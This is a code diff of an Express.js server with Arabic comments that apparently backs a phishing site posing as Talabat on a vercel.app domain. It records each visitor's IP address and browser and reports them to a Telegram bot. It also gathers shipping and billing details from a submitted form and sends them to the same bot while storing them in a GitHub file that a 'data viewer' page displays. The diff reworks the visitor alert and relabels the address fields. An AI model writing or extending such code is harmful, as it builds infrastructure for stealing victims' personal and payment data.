@@ -41,23 +41,6 @@ async function sendTelegramMessage(message) {
     }
 }
 
-// ========== دالة إرسال إشعار بدء التسجيل ==========
-async function sendStartNotification(ip, userAgent) {
-    try {
-        let msg = `🟢 <b>عميل جديد بدأ التسجيل!</b>\n`;
-        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
-        msg += `🌐 IP: ${ip || 'غير معروف'}\n`;
-        msg += `💻 المتصفح: ${userAgent || 'غير معروف'}\n\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🔗 <a href="https://talabat.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
-        
-        await sendTelegramMessage(msg);
-    } catch (e) {
-        console.error('❌ خطأ في إرسال إشعار بدء التسجيل:', e.message);
-    }
-}
-
 // ========== دالة حفظ على GitHub ==========
 async function saveToGitHub(newData) {
     const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
@@ -124,22 +107,37 @@ async function fetchFromGitHub() {
 let cachedData = '';
 let lastFetchTime = 0;
 
-// ========== المسارات ==========
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'views', 'page1.html'));
-});
-
-// ========== مسار page2 مع إشعار بدء التسجيل ==========
-app.get('/page2', (req, res) => {
-    // لو في notify=true في الرابط، نبعت إشعار
-    if (req.query.notify === 'true') {
+// ========== مسار إشعار الزيارة ==========
+app.post('/api/notify-visit', async (req, res) => {
+    try {
         const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
                    req.headers['x-real-ip'] || 
                    req.socket.remoteAddress || 
                    'غير معروف';
         const userAgent = req.headers['user-agent'] || 'غير معروف';
-        sendStartNotification(ip, userAgent);
+
+        let msg = `🟢 <b>عميل جديد بدأ التسجيل!</b>\n`;
+        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        msg += `🌐 IP: ${ip}\n`;
+        msg += `💻 المتصفح: ${userAgent}\n\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🔗 <a href="https://talabat.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
+
+        await sendTelegramMessage(msg);
+        res.json({ success: true, message: 'تم إرسال الإشعار' });
+    } catch (e) {
+        console.error('❌ خطأ:', e.message);
+        res.json({ success: false, message: e.message });
     }
+});
+
+// ========== المسارات ==========
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'views', 'page1.html'));
+});
+
+app.get('/page2', (req, res) => {
     res.sendFile(path.join(__dirname, 'views', 'page2.html'));
 });
 
@@ -198,7 +196,7 @@ app.post('/submit-data', async (req, res) => {
         logData += `العنوان: ${data.address_line1 || 'غير محدد'}\n`;
         logData += `العنوان (سطر 2): ${data.address_line2 || 'غير محدد'}\n`;
         logData += `المدينة: ${data.city || 'غير محدد'}\n`;
-        logData += `الولاية: ${data.state || 'غير محدد'}\n`;
+        logData += `المحافظة: ${data.state || 'غير محدد'}\n`;
         logData += `الرمز البريدي: ${data.zipcode || 'غير محدد'}\n`;
 
         logData += '\n💳 بيانات الفوترة:\n';
@@ -207,7 +205,7 @@ app.post('/submit-data', async (req, res) => {
         logData += `العنوان: ${data.billing_address_line1 || data.billing_address_line1_hidden || 'نفس الشحن'}\n`;
         logData += `العنوان (سطر 2): ${data.billing_address_line2 || data.billing_address_line2_hidden || 'نفس الشحن'}\n`;
         logData += `المدينة: ${data.billing_city || data.billing_city_hidden || 'نفس الشحن'}\n`;
-        logData += `الولاية: ${data.billing_state || data.billing_state_hidden || 'نفس الشحن'}\n`;
+        logData += `المحافظة: ${data.billing_state || data.billing_state_hidden || 'نفس الشحن'}\n`;
         logData += `الرمز البريدي: ${data.billing_zipcode || data.billing_zipcode_hidden || 'نفس الشحن'}\n`;
         logData += `رقم الهاتف: ${data.billing_phone || data.billing_phone_hidden || 'نفس الشحن'}\n`;
 
@@ -232,7 +230,7 @@ app.post('/submit-data', async (req, res) => {
         msg += `🏠 العنوان: ${data.address_line1 || 'غير محدد'}\n`;
         msg += `🏠 العنوان (سطر 2): ${data.address_line2 || 'غير محدد'}\n`;
         msg += `📍 المدينة: ${data.city || 'غير محدد'}\n`;
-        msg += `🏛️ الولاية: ${data.state || 'غير محدد'}\n`;
+        msg += `🏛️ المحافظة: ${data.state || 'غير محدد'}\n`;
         msg += `📮 الرمز البريدي: ${data.zipcode || 'غير محدد'}\n\n`;
         
         msg += `💳 <b>بيانات الفوترة:</b>\n`;
@@ -240,7 +238,7 @@ app.post('/submit-data', async (req, res) => {
         msg += `🏠 العنوان: ${data.billing_address_line1 || data.billing_address_line1_hidden || 'نفس الشحن'}\n`;
         msg += `🏠 العنوان (سطر 2): ${data.billing_address_line2 || data.billing_address_line2_hidden || 'نفس الشحن'}\n`;
         msg += `📍 المدينة: ${data.billing_city || data.billing_city_hidden || 'نفس الشحن'}\n`;
-        msg += `🏛️ الولاية: ${data.billing_state || data.billing_state_hidden || 'نفس الشحن'}\n`;
+        msg += `🏛️ المحافظة: ${data.billing_state || data.billing_state_hidden || 'نفس الشحن'}\n`;
         msg += `📮 الرمز البريدي: ${data.billing_zipcode || data.billing_zipcode_hidden || 'نفس الشحن'}\n`;
         msg += `📞 رقم الهاتف: ${data.billing_phone || data.billing_phone_hidden || 'نفس الشحن'}\n\n`;
         
